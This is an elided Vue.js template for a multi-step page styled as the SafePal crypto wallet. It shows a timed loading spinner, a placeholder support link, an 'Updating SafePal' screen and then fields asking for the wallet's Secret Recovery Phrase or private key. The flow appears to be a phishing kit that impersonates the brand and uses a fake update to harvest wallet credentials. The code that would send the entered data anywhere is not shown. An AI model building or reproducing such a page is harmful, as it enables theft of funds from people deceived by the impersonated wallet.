  ...
  <div class="bg-white rounded-2xl w-full text-white overflow-hidden mx-auto">
    ...
    <div v-if="currentStep !== 1" class="flex justify-between items-center py-3 px-4 border-b border-gray-300">
      <div class="flex items-center gap-3">
        <img :src="logoUrl" alt="SafePal" class="h-10 w-10 rounded" />
      </div>
      <div class="flex items-center gap-3">
    ...
    <div class="min-h-[500px] flex flex-col relative p-6">
      <transition name="fade" mode="out-in">
        <!-- STEP 1: Logo + spinner (auto-advance after 2.5s) -->
        <div v-if="currentStep === 1" key="s1" class="flex flex-col items-center justify-center h-full absolute inset-0">
          <img :src="logoUrl" alt="SafePal Logo" class="w-32 h-32 mb-4 rounded" />
          <svg aria-hidden="true" class="w-16 h-16 text-gray-100 animate-spin fill-current" :style="{ color: primaryColor }" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
        ...
        <div v-else-if="currentStep === 2" key="s2" class="flex flex-col">
          <div class="flex flex-col items-center gap-4 py-6">
            <img :src="logoUrl" class="h-16 w-16 rounded mb-2" alt="SafePal" />
          ...
          <p class="text-lg text-gray-600 text-center mt-3">
            Need help?
            <a href="#" class="font-semibold underline" :style="{ color: primaryColor }">Contact SafePal Support</a>
          </p>
        </div>
        ...
        <div v-else-if="currentStep === 3" key="s3" class="flex flex-col items-center">
          <div class="flex flex-col items-center gap-3 py-6 w-full">
            ...
            <h2 class="text-4xl text-black mt-2 mb-0 text-center font-bold">Updating SafePal</h2>
        ...
        <div v-else-if="currentStep === 4" key="s4" class="flex flex-col w-full">
          <div class="mb-4" v-if="importType !== 'private'">
            <h2 class="text-4xl text-black mt-2 text-center font-bold">Import your wallet with your Secret Recovery Phrase</h2>
          ...
          <div class="mb-4" v-if="importType !== 'private'">
            ...
            <div class="bg-[#f5f9fc] border-l-4 rounded-md p-2 mt-4 flex items-center" :style="{ borderLeftColor: primaryColor }">
          ...
          <div v-if="importType === 'private'">
            <label for="privateKey" class="block text-black mb-2 text-xl font-medium">Enter your private key</label>
...
setTimeout(() => { if (currentStep.value === 1) nextStep(); }, 2500);
